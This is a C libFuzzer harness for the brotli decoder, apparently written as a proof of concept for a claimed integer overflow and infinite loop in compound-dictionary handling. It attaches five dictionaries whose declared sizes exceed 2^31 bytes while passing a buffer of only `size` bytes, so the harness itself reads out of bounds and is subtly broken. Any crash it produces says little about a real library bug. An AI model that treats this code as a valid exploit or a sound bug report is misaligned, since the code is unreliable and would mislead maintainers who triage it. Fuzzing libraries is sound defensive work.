#include <stdint.h>
#include <stdlib.h>
#include <brotli/decode.h>

// Fuzz target for:
// Integer overflow in AttachCompoundDictionary()
// leading to infinite loop in EnsureCompoundDictionaryInitialized()

int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {
    // Create decoder instance
    BrotliDecoderState *state = BrotliDecoderCreateInstance(NULL, NULL, NULL);
    if (!state) return 0;

    // 🔥 Force dict_size > INT_MAX to trigger overflow
    size_t dict_size = ((size_t)1 << 31) + size;

    // 🔥 Attach multiple dictionaries to simulate cumulative overflow
    for (int i = 0; i < 5; i++) {
        BrotliDecoderAttachDictionary(
            state,
            BROTLI_SHARED_DICTIONARY_RAW,
            dict_size,
            data
        );
    }

    // 🔥 Trigger decoding path (important for infinite loop)
    uint8_t output[32];

    size_t available_in = size;
    const uint8_t *next_in = data;

    size_t available_out = sizeof(output);
    uint8_t *next_out = output;

    size_t total_out = 0;

    BrotliDecoderDecompressStream(
        state,
        &available_in,
        &next_in,
        &available_out,
        &next_out,
        &total_out
    );

    // Cleanup
    BrotliDecoderDestroyInstance(state);

    return 0;
}
